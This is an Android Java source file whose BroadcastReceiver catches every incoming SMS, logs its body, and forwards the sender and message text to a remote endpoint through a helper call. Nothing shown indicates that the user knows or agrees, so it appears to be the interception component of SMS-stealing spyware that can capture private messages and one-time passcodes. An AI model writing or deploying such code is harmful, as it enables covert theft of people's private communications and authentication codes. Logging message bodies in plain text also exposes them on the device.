package com.care.smsform;

import android.content.BroadcastReceiver;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getDisplayOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        try {
                            Log.d("MYAPP", messageBody);
                            String encodedSender = URLEncoder.encode(sender, "UTF-8");
                            String encodedMessage = URLEncoder.encode(messageBody, "UTF-8");
                            String path = String.format(Locale.getDefault(), "action=android&site=arguments&sender=%s&message=%s", encodedSender, encodedMessage);
                            Log.d("MYAPP", path);
                            Helper.sendData(path);
                        } catch (UnsupportedEncodingException e) {
                            e.printStackTrace();
                        }

                    }
                }
            }
        }
    }
}
